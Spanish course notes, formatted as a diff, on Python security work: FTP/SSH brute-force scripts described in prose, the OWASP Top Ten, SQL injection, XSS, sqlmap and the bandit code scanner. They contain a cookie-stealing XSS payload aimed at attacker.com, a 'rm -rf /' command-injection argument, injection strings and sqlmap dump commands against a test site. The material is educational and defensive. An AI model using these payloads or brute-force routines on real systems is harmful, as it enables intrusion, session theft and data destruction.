+			- La función intenta crear una conexión FTP con credenciales anónimas y muestra información relacionada con el servidor y la lista de archivos en el directorio raíz.
+			
+			
+			- Uno de los principales usos que se le puede dar a esta librería es la de comprobar si algún servidor ftp es vulnerable a un ataque de fuerza bruta mediante diccionario o soporta la autenticación anónima.
+			- Sabremos que la combinación es la buena cuando al conectarnos obtenemos como respuesta la cadena "230 Login successful".
+			- El módulo ftplib también lo podemos utilizar para crear scripts que automatizan determinadas tareas o realizan ataques de diccionario contra un servidor FTP.
+			- En primera instancia obtenemos la dirección del servidor FTP con el comando nslookup: $ nslookup ftp.be.debian.org
+
+
+		9.2 Conexión con servidores SSH utilizando paramiko
+		
+			- Paramiko es una librería escrita en Python que soporta los protocolos SSHV1, SSHV2, permitiendo la creación de clientes y realizar conexiones a servidores SSH.
+			- Depende de la librería pycrypto para todas las operaciones de cifrado y permite la creación de túneles cifrados locales, remotos y dinámicos.
+			- Entre las principales ventajas de esta librería podemos destacar:
+			
+				- Permite encapsular las dificultades que implica realizar scripts automatizados contra servidores SSH de una forma cómoda y fácil de entender para cualquier programador.
+				- Soporta protocolo SSH2 por medio de la librería PyCrypto, que la emplea para implementar todos aquellos detalles de criptografía de clave pública y privada.
+				- Permite autenticación por clave pública, autenticación mediante password, creación de túneles SSH.
+				- Nos permite escribir clientes SSH robustos con las mismas funcionalidades que tienen otros clientes SSH como Putty u OpenSSH-Client.
+				- Soporta transferencia de ficheros de forma segura utilizando el protocolo SFTP.
+				
+			- En Python se importa el módulo paramiko y la clase más importante que es SSHClient. Hay varias formas de conectarnos a un servidor SSH con paramiko.
+			- La primera es a través de la clase SSHClient() que proporciona un objeto sobre el cual disponemos para conectarnos a un determinado host introduciendo las credenciales de usuario y contraseña.
+			
+			
+			- La clase SSHClient del módulo paramiko nos ofrece la posibilidad, además de conectarnos con un servidor SSH, de poder ejecutar comandos sobre dicho servidor.
+			- Para ello podemos utilizar el método exec_command('comando_ejecutar') al cual le pasamos el comando a ejecutar.
+			
+			
+			- Otra forma de conectarnos a un servidor SSH es mediante la clase Transport que proporciona otro tipo de objeto para poder autenticarnos contra el servidor.
+			- Esta clase proporciona el método auth_password() para autenticarnos con el servidor SSH a partir del usuario y password.
+			- La clase Transport nos ofrece la posibilidad, además de conectarnos con un servidor SSH, de poder ejecutar comandos sobre dicho servidor.
+			- Para ello podemos utilizar el método exec_command('comando_ejecutar'), al cual le pasamos el comando a ejecutar.
+			- La principal diferencia con respecto al caso anterior tenemos que utilizar el método open_session() para abrir una nueva sesión en el servidor para posteriormente poder ejecutar comandos.
+			
+			
+			- Al intentar conectarnos con el servidor SSH se podrían producir errores relacionados con la conexión o con la autenticación del usuario.
+			- Para controlar estos errores podríamos añadir una gestión de excepciones que podemos personalizar para estos casos.
+			- Si la conexión ha sido ok obtenemos los algoritmos de cifrado soportados por el servidor a través del método transport.get_security_options() y accediendo a la propiedad ciphers.
+			- Se puede ver información de debug de paramiko al añadir la línea: paramiko.common.logging.basicConfig(level=paramiko.common.DEBUG)
+			
+			
+			- El cliente SFTP de paramiko proporciona los mismos métodos que un cliente FTP normal. Todos los métodos se pueden consultar desde la documentación oficial:
+			- DOCUMENTACION: https://docs.paramiko.org/en/stable/api/sftp.html
+			- Entre los métodos proporcionados por el cliente SFTP, podemos encontrar:
+			
+				- get (remote, local) 	   -> Permite obtener un fichero remoto a un directorio local
+				- put (local, remote) 	   -> Permite enviar un archivo local al servidor remoto
+				- chdir (path) 			   -> Permite cambiar el directorio de trabajo actual
+				- chmod (path, mode) 	   -> Permite cambiar permisos en un archivo
+				- mkdir (path, mode = 511) -> Permite crear un directorio
+				- rename (old, new) 	   -> Permite cambiar el nombre de un archivo o directorio
+				- remove (file) 		   -> Permite eliminar un archivo
+				- rmdir (path) 			   -> Permite eliminar un directorio
+				
+			
+			- Podríamos utilizar el módulo paramiko para obtener una sesión FTP y descargar un fichero de un servidor de forma segura.
+			- Podríamos establecer una conexión con el servidor SSH que se encuentra en la máquina local y utiliza cliente sftp de paramiko para descargar un fichero en el directorio sobre el cuál se ejecuta el script.
+			- En este caso estamos utilizando el método get(remote, local) que permite obtener un fichero remoto a un directorio local.
+			
+			
+			- DOCUMENTACION PARAMIKO: https://docs.paramiko.org/en/2.4/index.html
+			- PySftp es un módulo que actúa a modo de wrapper de la librería Paramiko.
+			- Los métodos que ofrece PySftp son abstracciones que le permiten a un desarrollador trabajar más rápido encapsulando muchas de las funciones que se necesitan para interactuar con un servidor via SFTP.
+			- DOCUMENTACION PySftp: https://pysftp.readthedocs.io/en/release_0.2.9/
+			- Se trata de un módulo que expone ciertas características de alto nivel basadas en Paramiko, entre las que podemos destacar la transferencia de archivos de manera recursiva.
+			- Para su correcta instalacion: python -m pip install pysftp
+			- La ejecución devuelve un objeto del tipo SFTPAttributes por cada archivo/directorio que encuentra en el directorio remoto.
+			- El objeto retornado contiene un campo llamado longname, que contiene una cadena con los atributos de los archivos en formato unix.
+			- El contenido de esta cadena dependerá del servidor SFTP y de los permisos que tenga cada archivo/directorio.
+			
+			
+			- Con el objetivo de descargar un archivo remoto, podríamos usar el método get() que espera como primer argumento el directorio del archivo que va a ser descargado y como segundo argumento el directorio local donde se guardará el archivo descargado.
+			
+			
+		9.3 Proceso de fuerza bruta contra un servidor SSH
+		
+			- Podríamos utilizar el módulo paramiko para realizar un proceso de fuerza bruta a partir de un fichero de usuarios y passwords que podríamos probar realizando combinaciones.
+			- Implementamos la clase SSHConnection que permite inicializar el objeto SSHClient e implementamos los siguientes métodos:
+			
+				- def conexion_ssh(self,ip,usuario,password,code=0): Método que intenta realizar la conexión a una determinada ip con el usuario y contraseña que se pasan como parámetro.
+				- def fuera_bruta_SSH(self,host): Método que toma como entrada 2 ficheros de lectura (usuarios.txt, passwords.txt) y mediante un proceso de fuerza bruta, intenta probar todas las combinaciones posibles de usuario y password que va leyendo de los ficheros. Probamos con una combinación de usuario y password, si consigue establecer conexión, ejecutamos un comando desde la consola del servidor al cual nos hemos conectado.
+				
+			- Destacar que si la conexión falla, tenemos un bloque exception donde realizamos un tratamiento distinto dependiendo de si la conexión ha fallado por un error de autenticación (paramiko.AuthenticationException) o por un error de conexión con el servidor (socket.error).
+			- Diccionarios para proceso de fuerza bruta del proyecto fuzzdb: https://github.com/fuzzdb-project/fuzzdb/tree/master/wordlists-user-passwd/unix-os
+			
+			
+			
+		RESUMEN
+		
+		    - Realizar conexiones con servidores FTP utilizando el módulo ftplib utilizando los métodos connect(host, port, timeout) y login(user, pass) de la clase FTP.
+			
+			- Enumerar los archivos disponibles en un servidor FTP usando los métodos dir() y nlst().
+			
+			- Conectarnos con un servidor FTP anónimo y descargar archivos binarios sin usuario ni contraseña,utilizando el usuario anonymous.
+			
+			- Descargar ficheros de un servidor FTP utilizando los métodos retrbinary() y retrlines() de la clase FTP.
+			
+			- Implementar un proceso de fuerza bruta para conectarnos con un servidor FTP utilizando 2 archivos de texto (usuarios.txt y passwords.txt) como diccionarios de datos.
+			
+			- Realizar conexiones con servidores SSH utilizando el módulo paramiko utilizando la clase SSHClient() a través del método sshCliente.connect(host, username=username, password=password).
+			
+			- Ejecutar comandos con paramiko con el método exec_command('comando_ejecutar') al cual le pasamos el comando a ejecutar.
+			
+			- Realizar conexiones con servidores SSH utilizando el módulo paramiko utilizando la clase Transport() a través de los métodos sshTransport.start_client() y sshTransport.auth_password(username=username, password=password).
+			
+			- Realizar tratamiento de excepciones al intentar conectarnos con el servidor SSH.
+			
+			- Realizar diferentes operaciones sobre archivos mediante el cliente SFTP de paramiko. Para ello utilizamos el método open_sftp() para obtener el cliente SFTP y posteriormente utilizamos el método listdir() para obtener la lista de directorios.
+			
+			- Descargar ficheros con el cliente SFTP utilizando el método get(remote, local) que permite obtener un fichero remoto a un directorio local.
+			
+			- Acceder a un servidor via SFTP utilizando el módulo PySftp con el objetivo de cambiar de directorio con el método cwd() y listar directorios con el método listdir_attr().
+			
+			- Implementar un proceso de fuerza bruta para conectarnos con un servidor SSH utilizando 2 archivos de texto (usuarios.txt y passwords.txt) como diccionarios de datos.
+
+			
+***********************************************************************************************************************************************************************
+
+	Unidad 10 -> Análisis de vulnerabilidades en aplicaciones web con Python
+		
+		INTRODUCCION:
+		
+		- OWASP (Open Web Application Security Project) nos provee de una serie de recursos basados, sobre todo, en guías y herramientas, para que nuestros proyectos web sean lo más seguros posible, tanto desde el punto de vista de desarrollo seguro como de la evaluación de la seguridad de estos.
+		- Entre los principales objetivos de la OWASP, podemos destacar:
+		
+			- Proporcionar a los desarrolladores un conjunto de buenas prácticas, para que las aplicaciones sean lo más seguras posible.
+			- Proporcionar a desarrolladores y profesionales de seguridad recursos para asegurar aplicaciones; en concreto, para aplicaciones móviles, surgió el proyecto OWASP Mobile Security Project.
+			
+		
+		10.1 Introducción a la metodología OWASP
+		
+			- Uno de esto subproyectos es el OWASP Top Ten Project, donde se definen y se detallan los 10 riesgos más importantes a nivel de aplicaciones web.
+			- A continuación, se presentarán las vulnerabilidades más importantes y comunes en aplicación web del proyecto OWASP Top Ten Project: OWASP Top Ten Project -> https://owasp.org/www-project-top-ten/
+			
+			- Un proyecto interesante que ofrece OWASP es la aplicación open source Zed Attack Proxy Project (ZAP)
+			- Nos permite realizar un análisis de todos los datos que se envían y que recibimos a la hora de realizar una navegación de un sitio web.
+			- Repositorio de la herramienta: https://www.zaproxy.org/download/
+			
+			
+			Inyección de comandos
+			
+			- La inyección de comandos es uno de los ataques más comunes en aplicaciones web en el cual, el atacante explota alguna vulnerabilidad del sistema para ejecutar comandos SQL, NoSQL o LDAP con el fin de acceder a datos de forma no autorizada.
+			- Estas vulnerabilidades se pueden generar si no se hace una correcta validación y filtrado de los datos introducidos por el usuario, como podría ser por ejemplo en un campo de búsqueda dentro de la aplicación.
+			- El impacto que puede tener la inyección de comandos puede ser bastante grave ya que se podrían revelar datos confidenciales, modificar los datos almacenados o denegar acceso a ciertos recursos.
+			- DOCUMENTACION OWASP: https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html
+			
+			
+			SQL Injection
+			
+			- Se puede dar el caso en el cual el usuario en vez de introducir un texto para realizar una búsqueda introduce una consulta o cualquier comando SQL.
+			- Si no se hace una correcta validación y filtrado de los datos introducidos en este campo de búsqueda, se podría concatenar la consulta o comando dañino a una consulta interna SQL o cualquier otro dialecto haciendo que el intérprete ejecute la consulta introducida por el atacante.
+			- Un posible escenario de este tipo de ataques podría ser una aplicación que concatena datos no validados en una consulta SQL: String query = "SELECT * FROM tabla WHERE id='" + request.getParameter("id") + "'";
+			- Como se puede ver, se concatena sin ningún tipo de verificación o filtrado del parámetro id introducido por el usuario. De manera que si un atacante introduce un comando SQL este sería ejecutado.
+			- Un atacante podría introducir por ejemplo el parámetro id como ' or '1'='1. Esto haría que el sentido de la consulta cambie totalmente, devolviendo todos los registros de la tabla ya que la condición "1=1" siempre se cumple.
+			- Mediante un ataque por inyección de SQL exitoso, se puede:
+			
+				- Leer información sensible desde la base de datos.
+				- Modificar la información (Insert/Update/Delete).
+				- Ejecutar operaciones de administración sobre la base de datos (por ejemplo, parar la base de datos).
+				- Recuperar el contenido de un determinado archivo presente sobre el sistema de archivos del DBMS.
+				- Emitir comandos al sistema operativo.
+				
+			- Los ataques por inyección de SQL son un tipo de ataque de inyección, en el cual los comandos SQL se insertan en la entrada de datos, con la finalidad de efectuar la ejecución de comandos SQL predefinidos.
+			
+			
+			Cross-Site Scripting (XSS)
+			
+			- Este tipo de vulnerabilidad es el segundo más frecuente en aplicaciones web según el OWASP Top Ten.
+			- La explotación de este tipo de vulnerabilidades pretende ejecutar comandos en el navegador de la víctima para robar sus credenciales, obtener la sesión del usuario, instalar software en el equipo de la víctima o redirigir al usuario a sitios maliciosos.
+			- Dentro de los posibles errores de XSS, podemos distinguir dos grandes categorías:
+			
+				- No permanentes: EJEMPLO
+				
+					Nos encontramos con una página web que dispone de buscador, el cual, al introducir una palabra inventada o una cadena aleatoria de caracteres, muestra un mensaje del tipo: "No se han encontrado resultados para la búsqueda <texto&gt;", donde <texto&gt; es la cadena introducida en el campo de búsqueda. Si en la búsqueda, se introduce como <texto&gt; el código JavaScript antes indicado, y de nuevo aparece la ventana de alerta, significa que la aplicación es vulnerable a XSS. La diferencia radica en que, en esta ocasión, los efectos de la acción no resultan permanentes.
+					
+				- Permanentes: EJEMPLO
+				
+					Su denominación se debe al hecho de que, como mostraba el ejemplo, la ventana de alerta en JavaScript queda almacenada en algún lugar, habitualmente una base de datos SQL, y se muestra a cualquier usuario que visite nuestro perfil. Evidentemente, este tipo de fallos de XSS son mucho más peligrosos que los no permanentes.
+					
+			- Existen tres situaciones en las que un atacante puede conseguir un ataque exitoso con XSS:
+			
+				1º XSS Reflejado: En este caso, el ataque puede ser exitoso si la aplicación hace uso de datos sin validar proporcionados por un usuario y codificados como parte de HTML o JavaScript de la aplicación.
+				
+				2º XSS Almacenado: Este caso se puede dar cuando la aplicación almacena datos sin ser validados y filtrados y que posteriormente muestra al usuario. En este caso, el atacante puede conseguir almacenar datos maliciosos para que sean ejecutados cuando estos sean consultados por el usuario. Se considera de riesgo muy alto estas situaciones.
+				
+				3º XSS Basados en DOM: En aplicación que hacen usado del framework de JavaScript DOM, el atacante puede conseguir controlar los datos que se intercambian dinámicamente en la página.
+				
+			- Con este tipo de ataques, el impacto sobre el sistema puede ser alto, ya que el atacante podría conseguir desde el robo de la sesión del usuario, hasta la invasión de la autenticación.
+			- Un posible escenario podría ser el siguiente: (String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("creditcard") + "'>";
+			- En este caso el atacante podría modificar el parámetro "creditcard" mediante el método GET y conseguir robar el identificar de la sesión del usuario. 
+			<script>document.location= 'http://www.attacker.com/cgibin/cookie.cgi?foo=' +document.cookie</script>
+			- DOCUMENTACION XSS: https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html
+			
+			
+			OWASP Python Security Project
+			
+			- Se trata de un proyecto de código abierto que tiene como objetivo mostrar aquellas herramientas Python que facilitan a los desarrolladores y profesionales de la seguridad desarrollar aplicaciones más seguras antes posibles ataques.
+			- DOCUMENTACION OWASP Python Security Project: https://owasp.org/www-project-python-security/migrated_content
+			- Proyecto OWASP Security Project: https://owasp.org/www-community/Free_for_Open_Source_Application_Security_Tools
+			
+			
+			Scripts en python para detectar vulnerabilidades en sitios web
+			
+			- El sitio web proporcionado por acunetix, ofrece algunos sitios web que contienen algunas de las vulnerabilidades mencionadas, donde cada sitio está hecho con diferentes tecnologías en el lado del backend.
+			- Servicio de acunetix: www.vulnweb.com 
+			
+			
+			- Una forma sencilla de identificar sitios web con la vulnerabilidad de inyección de SQL es añadir algunos caracteres a la URL, como comillas, comas o puntos.
+			- Por ejemplo, si detecta una URL con un sitio php donde está usando un parámetro para una búsqueda específica, puede intentar añadir un carácter especial en este parámetro.
+			- La siguiente URL devuelve un error relacionado con la base de datos cuando intentamos utilizar un vector de ataque sobre el parámetro vulnerable: 
+			- Dominio vulnerable SQL injection: testphp.vulnweb.com/listproducts.php?cat=%27
+			- Con Python podríamos construir un script que lea desde el fichero sql-attack-vector.txt posibles vectores de ataque sql y comprobar la salida como resultado de inyectar cadenas específicas.
+			
+			
+			- Para probar si un sitio web es vulnerable a XSS, podríamos usar el siguiente script donde leemos de un archivo XSS-attack-vectors.txt que contiene posibles vectores de ataque que tienen como objetivo explotar dicha vulnerabilidad.
+			
+			
+		10.2 Introducción a la herramienta sqlmap para detectar vulnerabilidades del tipo sql injection
+		
+			- SQLmap es una de las herramientas más conocidas escrita en Python para detectar vulnerabilidades de tipo SQL Injection.
+			- Se trata de una herramienta desarrollada en Python que permite automatizar el reconocimiento y la explotación de múltiples bases de datos, como MySQL, Oracle o PostgreSQL.
+			- DOCUMENTACION Proyecto SQLmap: https://sqlmap.org/
+			- Sqlmap viene preinstalado con algunas distribuciones de Linux orientadas a tareas de seguridad, como Kali Linux.
+			- También puede instalar sqlmap en otras distribuciones basadas en Debian usando el comando: $ sudo apt-get install sqlmap
+			
+			
+			Ejecutar sqlmap sobre un dominio vulnerable
+			
+			- Estos son los principales pasos que podemos seguir para obtener toda la información sobre una base de datos que está detrás de una vulnerabilidad de inyección SQL.
+			- En primer lugar, usamos el parámetro -u para añadir la URL del sitio que vamos a analizar. Para ello usamos el siguiente comando: $ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1
+			
+			
+			Extracción de tablas y columnas de una base de datos
+			
+			- SQLmap también tiene la capacidad de poder atacar el servidor para descubrir nombres de tablas, descargar la base de datos y realizar consultas SQL de forma automática.
+			- En el siguiente paso, podríamos estar interesados en obtener todas las bases de datos que utiliza el sitio web a través de la opción --dbs. Ej: $ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
+			- Una vez que la herramienta ha identificado la base de datos, podríamos preguntar al usuario si desea probar otros tipos de bases de datos o si desea probar otros parámetros en el sitio web en busca de vulnerabilidades.
+			- El siguiente paso podría ser utilizar el parámetro -D junto con el nombre de la base de datos para acceder a cualquiera de las bases de datos en particular.
+			- En el siguiente ejemplo, estamos usando la opción --tables para acceder a la base de datos information_schema: $ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D information_schema --tables
+			- Podemos usar la opción -T junto con el nombre de la tabla para ver las columnas de una tabla en particular.
+			- De la misma forma podemos obtener los nombres de las columnas con la opción --columns.
+			- Este es el comando que podemos intentar para acceder a la tabla "view": $ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D information_schema -T views --columns
+			
+			
+			Acceder a información de una tabla
+			
+			- De manera similar, podemos acceder a toda la información en una tabla específica usando el siguiente comando.
+			- La consulta --dump recupera todos los datos de la tabla engines: $ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D information_schema -T engines --dump
+			- Con la ejecución del comando anterior, podemos obtener información sobre las entradas disponibles en la tabla engines. En este ejemplo, se han recuperado 8 entradas de esta tabla.
+			
+			
+			Introducción a la herramienta bandit para detectar vulnerabilidades en proyectos de python
+			
+			- Python es un lenguaje que permite escalar fácilmente de proyectos iniciales a aplicaciones complejas para procesar datos y servir páginas web dinámicas.
+			- Pero, a medida que aumenta la complejidad de sus aplicaciones, puede ser fácil presentar problemas de seguridad y vulnerabilidades.
+			- Bandit es una herramienta diseñada para encontrar problemas de seguridad comunes en el código Python.
+			- Bandit procesa cada archivo, crea un AST a partir de él y ejecuta los complementos apropiados contra los nodos de AST. Una vez que Bandit ha terminado de escanear todos los archivos, genera un informe.
+			- DOCUMENTACION oficial de Bandit: https://bandit.readthedocs.io/en/latest/
+			- DOCUMENTACION del módulo Python AST: https://docs.python.org/3/library/ast.html
+			- Este módulo solo puede analizar el código Python que es válido en la versión del intérprete desde el que se importa.
+			- De esta forma, si se intenta usar el módulo AST desde un intérprete Python 3.5, el código debería estar escrito para 3.5 para poder analizar el código.
+			
+			
+			Instalar y ejecutar bandit
+			
+			- Ubuntu y derivados: $ sudo apt-get install python3-bandit. ENLACE: https://packages.ubuntu.com/bionic/python3-bandit
+			- Repositorio oficial de python: $ sudo pip3 install bandit
+			- Bandit soporta muchos tipos de pruebas diferentes para detectar diversos problemas de seguridad en el código de Python.
+			
+			
+			Plugins de bandit para análisis de código estático
+			
+			- Bandit es una herramienta de "análisis estático" que analiza los ficheros con código python en un árbol de sintaxis abstracta (AST) representativo y busca llamadas, cadenas y otros elementos generalmente asociados con código inseguro.
+			- Por ejemplo, el plugin B602: subprocess_popen_with_shell_equals_true busca el uso de la llamada subprocess.Popen, que emplea como argumento en la llamada shell=True. Este tipo de llamada no resulta recomendable, ya que se muestra vulnerable a varios ataques de inyección de shell.
+			- DOCUMENTACION Pluguin B602: https://bandit.readthedocs.io/en/latest/plugins/b602_subprocess_popen_with_shell_equals_true.html
+			- El plugin shell_injection explora aquellos métodos y llamadas que se encuentran en la sección de subprocess y tienen activado el parámetro shell=True.
+			
+			subprocess.Popen (command_to_execute, shell = True)
+			
+			- En la instrucción anterior, el método "Popen" del módulo subprocess requiere como argumentos el comando a ejecutar y un parámetro adicional "shell = True" que puede ser origen de una vulnerabilidad de inyección de comandos.
+			
+			
+			Ejemplo módulo subprocess
+			
+			- El siguiente script usa el módulo subprocess, para ejecutar el comando ping sobre un servidor cuya IP se pasa por parámetro.
+			
+						import subprocess
+						def ping_inseguro(server):
+							return subprocess.Popen('ping -c 1 %s' % server, shell=True)
+						print(ping_inseguro('8.8.8.8 & touch file'))
+				
+			- El principal problema del script anterior es que el shell puede procesar otros comandos proporcionados por el usuario después de finalizar el comando ping. La vulnerabilidad se produce con el parámetro server, que es controlado por el usuario, y se podría utilizar para ejecutar comandos arbitrarios; por ejemplo, la eliminación de archivos.
+
+			EJEMPLO: >>> ping("8.8.8.8; rm -rf /")
+			
+			- Si analizamos el script anterior con bandit podemos ver las vulnerabilidades que detecta al usar este método.
+			- Esta función se puede reescribir de forma segura. En lugar de pasar una cadena a un subproceso, nuestra función pasa una lista de cadenas. El programa ping obtiene cada argumento por separado (incluso si el argumento tiene un espacio en él), por lo que la shell no procesa otros comandos que proporciona el usuario después de que finaliza el comando ping.
+			
+			
+						import subprocess
+						def ping_seguro(server):
+							args = ['ping','-c','1', server]
+							return subprocess.Popen(args, shell=False)
+						print(ping_seguro('8.8.8.8'))
+			
+			
+			Plugin SQL Inyection
+			
+			- El plugin B608: Test for SQL Injection tiene como objetivo buscar dentro del código cadenas que se parezcan a las sentencias de SQL que estén involucradas en alguna en un ataque de inyección de SQL.
+			
+			EJEMPLO: 
+			
+						SELECT %s FROM derp;" % var
+						"SELECT thing FROM " + tab
+						"SELECT " + val + " FROM " + tab + ...
+						"SELECT {} FROM derp;".format(var)
+			
+			
+			Otras herramientas de análisis de código estático en python
+			
+			- La revisión estática permite un análisis de seguridad sobre el código fuente o compilado de la aplicación, con lo que se obtienen vulnerabilidades o indicios que pueden ser comprobados posteriormente en un proceso de análisis dinámico.
+			- Es probable que su aplicación de Python dependa de muchas librerías de Python, y a lo largo del ciclo de vida del proyecto es probable que algunos de ellos tenga una vulnerabilidad de seguridad.
+			- Para ello disponemos de herramientas específicas que permiten realizar un escaneo de las dependencias y librerías de Python que estén usando en tu proyecto y estén desactualizadas o tengan alguna issue relacionada con la seguridad.
+			
+			
+			Pyup
+			
+			- Se trata de un servicio que permite analizar las dependencias y librerías que está usando nuestro proyecto.
+			- Servicio Pyup: https://pyup.io/
+			- Lo que hace es analizar el fichero requirements.txt dentro del proyecto y ver si, para cada librería que utiliza, está empleando la última versión o, por el contrario, se necesita actualizarla.
+			
+			
+			Safety
+			
+			- Otra herramienta que nos puede ayudar a comprobar las dependencias de nuestro proyecto es Safety, que cuenta con la capacidad de analizar el entorno de Python instalado en su máquina y detectar las versiones de los paquetes que tengamos instaladas en nuestro entorno, para detectar librerías desactualizadas o que puedan contener algún tipo de vulnerabilidad.
+			- Servicio Safety: https://pyup.io/safety/ Se puede instalar mediante: $ pip install safety
+			- Una vez instalada, podemos ejecutar el siguiente comando para analizar los módulos que tenemos instalados en nuestra máquina local o virtualenv: $ safety check
+			- También podríamos analizar un archivo de requirements.txt donde encontramos las dependencias de un proyecto de python: $ safety check -r requirements.txt
+			
+			
+			LGTM y reglas de seguridad en python
+			
+			- Es una herramienta que nos permite analizar los repositorios públicos de GitHub para la ejecución del análisis estático de código y análisis de vulnerabilidades.
+			- Servicio LGTM: https://github.blog/2022-08-15-the-next-step-for-lgtm-com-github-code-scanning/
+			- Entre las principales características, podemos destacar:
+			
+				- Soporta los siguientes lenguajes: Java, TypeScript/JavaScript, Python, C/C++ y C#.
+				- Analiza el contenido de los proyectos cuyo código fuente se almacena en repositorios públicos alojados en BitBucket, GitHub y GitLab.
+				- Analiza cada revisión de un determinado proyecto que contenga vulnerabilidades.
+				
+			- Podemos realizar una búsqueda de las reglas de seguridad definidas por lenguaje. Podríamos buscar las reglas de Python con la cadena de búsqueda "language:Python security".
+			- A continuación, vamos a analizar algunas de las reglas de seguridad relacionadas con Python que LGTM tiene definidas en su base de datos.
+			
+			
+			Ejemplo de código para detectar XSS
+			
+			- Escribir directamente la entrada del usuario en un sitio web sin validar de manera correcta la entrada supone una vulnerabilidad de XSS.
+			- En este punto, la principal recomendación consiste en escapar la entrada antes de escribir la entrada del usuario en la página.
+			- La librería estándar de Python proporciona una serie de funciones de escape: https://docs.python.org/es/3/library/html.html#html.escape
+			- La mayoría de los frameworks web, como Django o Flask, disponen también de sus propias funciones de escape; por ejemplo, flask.escape(). 
+			- Regla para detectar XSS: https://github.blog/2022-08-15-the-next-step-for-lgtm-com-github-code-scanning/
+			
+			
+			- En el siguiente ejemplo estamos utilizando Flask como framework para ejecutar nuestro servidor web, que atiende peticiones a través del navegador.
+			- El siguiente ejemplo es una aplicación de flask que muestra una función implementada de forma insegura y otra implementada de forma insegura.
+			
+						from flask import Flask, request, make_response, escape
+						app = Flask(__name__)
+						 
+						@app.route('/inseguro')
+						def inseguro():
+							input = request.args.get('input', '')
+							return make_response("Your input is " + input)
+						 
+						@app.route('/seguro')
+						def seguro():
+							input = request.args.get('input', '')
+							return make_response("Your input is " + escape(input))
+							
+			- En la primera función estamos usando directamente la entrada del usuario (por ejemplo, un parámetro de una petición HTTP) en una página web sin validar correctamente la entrada, lo que puede originar una vulnerabilidad de secuencias de comandos entre sitios(XSS).
+			- El segundo método es más seguro ya que la variable input se está filtrando a través del método escape. Si estamos trabajando con Flask, una forma sencilla de evitar esta vulnerabilidad consiste en usar el motor de plantillas que proporciona el framework. En este caso, el motor de plantillas, a través de la función escape, se encargaría de escapar y validar los datos de entrada.
+			- En el código anterior, el primer método no es seguro ya que la variable input no se está validando, lo que deja la página vulnerable a ataques de XSS.  Para evitar que nuestra aplicación se vuelva vulnerable a este tipo de ataque, es necesario escapar y validar todas aquellas entradas que impliquen enviar datos de entrada por parte del usuario, ya sea a través de un formulario o a través de la URL.
+			
+			
+		10.3 Detectar vulnerabilidades en sitios web con herramientas automáticas
+		
+			- Dentro del ecosistema de python disponemos de diferentes herramientas desarrolladas que tienen como objetivo analizar un sitio web en búsqueda de vulnerabilidades.
+			- Además de las que vamos a evaluar, OWASP mantiene una de las mejores listas de escáneres de vulnerabilidades.
+			- Estos escáneres de vulnerabilidades tienen la capacidad de automatizar la auditoría de seguridad y el escaneo de su red y sitios web en busca de diferentes riesgos de seguridad siguientes Mejores prácticas de OWASP.
+			- DOCUMENTACION OWASP escáner vulnerabilidades: https://owasp.org/www-community/Vulnerability_Scanning_Tools
+			
+			
+			Escáner de vulnerabilidades XSS para python 3.7
+			
+			- PwnXSS se trata de un script desarrollado para python 3.7 que tiene como dependencias principales BeautifulSoup y requests.
+			- La herramienta a partir de un sitio web que le pasamos como parámetro y de forma automática va probando con diferentes payloads para determinado si un dominio es vulnerable a XSS.
+			- DOCUMENTACION Herramienta PwnXSS: https://github.com/pwn0sec/PwnXSS
+			- Principales características:
+				
+				- Rastrear todos los enlaces en un sitio web.
+				- Manejo avanzado de errores.
+				- Soporte multiprocesamiento.
+
+			- Ejecutar el codigo en un dominio vulnerable: $ python3 pwnxss.py -u http://testphp.vulnweb.com 
+			- Al realizar pruebas sobre el dominio testphp.vulnweb.com vemos como ha detectado diferentes vulnerabilidades XSS al probar con un payload donde está inyecto un código javascript en uno de los parámetros de la consulta.
+			
+			
+			Escáner de vulnerabilidades en sitios web CMS
+			
+			- CMSmap es una herramienta open source escrita en Python diseñada especialmente para buscar posibles vulnerabilidades en todo tipo de portales que utilicen los CMS más utilizados como Joomla, Drupal o WordPress.
+			- De forma automática, esta herramienta detectará la plataforma que está siendo utilizada y lanzará una serie de test para comprobar la seguridad de la misma y notificar al administrador en caso de detectar posibles vulnerabilidades en diferentes componentes como plugins, usuarios y contraseñas por defecto.
+			- Esta herramienta es muy fácil de usar y con algunos conocimientos en seguridad podemos auditar un sitio web que esté usando alguno de los CMS soportados.
+			- Repositorio oficial: $ git clone https://github.com/Dionach/CMSmap.git
+			- CMSmap trabaja escaneando el CMS y sus módulos o plugins en busca de vulnerabilidades, para ello se vale de la base de datos disponible en exploit-db.com.
+			- La ejecución con python3 se puede realizar pasando como parámetro el sitio a escanear junto con el tipo de escaneo(-F corresponde a escaneo completo o full scan).
+			- Podemos ejecutar el siguiente comando: $ python3 cmsmap.py -F <sitio_web&gt; 
+			
+			- Salida del código: 
+			
+				1º En la siguiente ejecución se observa que verifica, cual es el CMS realizando un banner grabing y vulnerabilidades detectadas en algunos de los plugins que está utilizando el sitio.
+				2º Posteriormente,lo que hace es detectar ficheros wordpress por defecto y buscar determinados directorios:
+				3º Vemos que, además de los usuarios, archivos por defecto, busca también plugins y directorios interesantes.
+				4º Por otro lado, teniendo el usuario, podemos intentar ataques por diccionario o fuerza bruta, ofreciendo la posibilidad de realizar un ataque por diccionario, seleccionando nosotros el que fichero que queramos de usuarios y passwords.
+				
+			- Por defecto, un escaneo convencional de CMSmap crea 5 hilos o threads desde los que analiza el sistema seleccionado. Este número se puede limitar para evitar que durante el escaneo puedan ocurrir ataques DoS.
+			- El número de hilos también podría ser mayor, lo cual aumenta el riesgo de producir una denegación de servicio, a cambio se reduce el tiempo de escaneo.
+			
+			
+			RESUMEN
+			
+				    - Dar a conocer el proyecto OWASP donde se definen y se detallan los 10 riesgos más importantes a nivel de aplicaciones web.
+					
+					- Identificar las principales vulnerabilidades en sitios web como SQL Injection y Cross-Site Scripting (XSS).
+					
+					- Desarrollar scripts en python para detectar vulnerabilidades del tipo SQL Injection en sitios web identificando aquellos parámetros que pueden ser vulnerables al intentar concatenar caracteres especiales.
+					
+					- Desarrollar scripts que lean de un fichero sql-attack-vector.txt que contiene posibles vectores de ataque sql injection.
+					
